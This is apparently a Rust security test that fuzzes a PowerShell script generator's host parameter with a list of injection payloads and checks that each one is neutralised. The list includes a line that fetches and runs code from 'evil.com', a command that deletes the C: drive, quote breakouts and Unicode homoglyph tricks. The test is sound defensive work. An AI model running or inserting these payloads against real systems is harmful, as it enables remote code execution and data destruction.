use airctrl_lan::generate_run_ps1;

fn check_delimiter_balance(script: &str) -> Result<(), String> {
    let mut stack = Vec::new();
    let chars: Vec<char> = script.chars().collect();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < chars.len() {
        let c = chars[i];
        if in_single_quote {
            if c == '\'' {
                if i + 1 < chars.len() && chars[i + 1] == '\'' {
                    i += 2; // escaped single quote in PowerShell: ''
                    continue;
                }
                in_single_quote = false;
            }
        } else if in_double_quote {
            if c == '`' {
                i += 2;
                continue;
            }
            if c == '"' {
                in_double_quote = false;
            }
        } else {
            match c {
                '\'' => in_single_quote = true,
                '"' => in_double_quote = true,
                '{' | '(' | '[' => stack.push((c, i)),
                '}' => {
                    let top = stack.pop().ok_or_else(|| format!("Unmatched closing brace }} at {}", i))?;
                    if top.0 != '{' {
                        return Err(format!("Mismatched brace pair at char {}", i));
                    }
                }
                ')' => {
                    let top = stack.pop().ok_or_else(|| format!("Unmatched closing paren ) at {}", i))?;
                    if top.0 != '(' {
                        return Err(format!("Mismatched paren pair at char {}", i));
                    }
                }
                ']' => {
                    let top = stack.pop().ok_or_else(|| format!("Unmatched closing bracket ] at {}", i))?;
                    if top.0 != '[' {
                        return Err(format!("Mismatched bracket pair at char {}", i));
                    }
                }
                _ => {}
            }
        }
        i += 1;
    }

    if in_single_quote {
        return Err("Unclosed single quote".to_string());
    }
    if in_double_quote {
        return Err("Unclosed double quote".to_string());
    }
    if !stack.is_empty() {
        return Err(format!("Unclosed delimiters remaining: {:?}", stack));
    }
    Ok(())
}

#[test]
fn test_challenger_160_payload_powershell_fuzzing() {
    let mut hostile_payloads = vec![
        // 1. Subexpression command execution
        "$(calc.exe)",
        "$([System.IO.File]::ReadAllText('C:\\Windows\\System32\\drivers\\etc\\hosts'))",
        "$(&'calc')",
        "$($x=1;$y=2)",
        "$(Stop-Process -Name airctrl -Force)",
        "$(whoami)",
        "$(rmdir /s /q C:\\)",
        "$(Invoke-Expression 'calc.exe')",
        "192.168.1.1$(calc.exe)",
        "$(calc.exe)192.168.1.1",

        // 2. Semicolons and statement chaining
        "; calc.exe ;",
        "192.168.1.1; Write-Host PWNED",
        "192.168.1.1 ; Stop-Process -Name airctrl -Force ;",
        ";; calc.exe ;;",
        "; exit 0 ;",
        "localhost; iex (irm evil.com)",

        // 3. Quote breakout & escaping attacks
        "'",
        "''",
        "'''",
        "''''",
        "\"",
        "\"\"",
        "\"\"\"",
        "'; calc.exe; '",
        "\"; calc.exe; \"",
        "' ; Write-Host 'hacked' ; '",
        "\" ; Write-Host \"hacked\" ; \"",
        "192.168.1.1' -or '1'='1",
        "192.168.1.1\" -or \"1\"=\"1",
        "192.168.1.1' --",
        "192.168.1.1\" --",
        "192.168.1.1`' ; calc.exe ; `",
        "192.168.1.1`\" ; calc.exe ; `",

        // 4. Backticks and escaping
        "`",
        "``",
        "`n",
        "`r",
        "`0",
        "`$(calc.exe)",
        "192.168.1.1`",

        // 5. Variable interpolation probes
        "$env:COMPUTERNAME",
        "$env:USERNAME",
        "$env:LOCALAPPDATA",
        "$env:PATH",
        "$HostIp",
        "$Port",
        "$BinaryName",
        "$ExecutionContext",
        "$PID",
        "$$",
        "$?",

        // 6. Pipeline, logical operators, redirection
        "| iex",
        "192.168.1.1 | Out-Null",
        "& {calc.exe}",
        "&& calc.exe",
        "|| calc.exe",
        "> C:\\pwned.txt",
        ">> C:\\pwned.txt",
        "< C:\\test.txt",

        // 7. Newline and carriage return injections with commands
        "\ncalc.exe\n",
        "\r\ncalc.exe\r\n",
        "192.168.1.1\nInvoke-Expression 'calc'",
        "192.168.1.1\r\nInvoke-Expression 'calc'",
        "\rcalc.exe\r",
        "\tcalc.exe",
        "\0evil.exe",
        "192.168.1.1\0evil",

        // 8. Non-ASCII and Unicode homoglyphs
        "＄(calc)",
        "１９２.１６８.１.１",
        "192。168。1。1",
        "“calc”",
        "‘calc’",
        "192.168.1.1\u{200b}",
        "192.168.1.1\u{202e}",
        "test\u{ff04}(calc)",

        // 9. Special symbols & delimiters
        "(calc.exe)",
        "{calc.exe}",
        "[calc.exe]",
        "<# comment #>",
        "# comment",
        "192.168.1.1{{{(((",
        "192.168.1.1}})))",

        // 10. Boundary lengths and invalid hostnames
        "",
        " ",
        "   \t  \n  ",
        "-localhost",
        "localhost-",
        ".localhost",
        "localhost.",
        "192..168.1.1",
        "192.168.1.256",
        "256.256.256.256",
        "1.2.3.4.5",
        "999.999.999.999",

        // 11. Valid hostnames and IPs (must be preserved)
        "127.0.0.1",
        "192.168.1.100",
        "10.0.0.1",
        "172.16.0.1",
        "0.0.0.0",
        "::1",
        "[::1]",
        "fe80::1ff:fe00:1",
        "[fe80::1ff:fe00:1]",
        "localhost",
        "windows-build-vm",
        "windows-build-vm.internal.corp",
        "my-dev-box-01.lan",
    ];

    // Permutations
    for c in ["$", ";", "`", "'", "\"", "\n", "\r", "&", "|", "(", ")", "{", "}"] {
        hostile_payloads.push(Box::leak(format!("192.168.1.1{}test", c).into_boxed_str()));
        hostile_payloads.push(Box::leak(format!("{}192.168.1.1", c).into_boxed_str()));
    }

    println!("[*] Total adversarial payloads to test against Rust generate_run_ps1: {}", hostile_payloads.len());

    let mut failures = Vec::new();

    for (idx, payload) in hostile_payloads.iter().enumerate() {
        for port in [80, 8080, 65535] {
            let script = generate_run_ps1(payload, port);

            // 1. Delimiter balance check
            if let Err(err) = check_delimiter_balance(&script) {
                failures.push(format!("Payload #{}: {:?} caused delimiter imbalance: {}", idx, payload, err));
            }

            // 2. Extract $HostIp assignment line
            let host_line = script
                .lines()
                .find(|l| l.starts_with("$HostIp = "))
                .unwrap_or("");

            assert!(!host_line.is_empty(), "Missing $HostIp line");

            // 3. Ensure no unescaped single quotes break string literal boundary
            let without_escaped = host_line.replace("''", "");
            if without_escaped.matches('\'').count() != 2 {
                failures.push(format!("Payload #{}: {:?} broke single-quote bounds in line: {}", idx, payload, host_line));
            }

            // 4. Critical Security Verification:
            // The generated $HostIp line must NEVER contain active subexpression `$(`
            // or command separator `;` outside single quotes
            if host_line.contains("$(") {
                failures.push(format!(
                    "VULNERABILITY: Payload #{}: {:?} resulted in executable subexpression in line: {}",
                    idx, payload, host_line
                ));
            }

            // 5. If trimmed payload contains active injection characters, it must either:
            // a) Safely fall back to 127.0.0.1, OR
            // b) Be safely neutralized and enclosed in single quotes without any unescaped injection
            let trimmed = payload.trim();
            let contains_injection = trimmed.chars().any(|ch| {
                matches!(ch, '$' | ';' | '`' | '\'' | '"' | '\n' | '\r' | '&' | '|' | '(' | ')' | '{' | '}' | '\0')
            });

            if contains_injection && !host_line.contains("127.0.0.1") {
                failures.push(format!(
                    "VULNERABILITY: Hostile payload #{}: {:?} was not neutralized to 127.0.0.1! Got: {}",
                    idx, payload, host_line
                ));
            }
        }
    }

    if !failures.is_empty() {
        println!("[-] Found {} failures in Rust generate_run_ps1 fuzzing:", failures.len());
        for f in failures.iter().take(10) {
            println!("    {}", f);
        }
        panic!("Fuzzing test failed with {} vulnerabilities!", failures.len());
    } else {
        println!("[+] All {} hostile payload permutations safely neutralized by Rust generate_run_ps1!", hostile_payloads.len() * 3);
    }
}
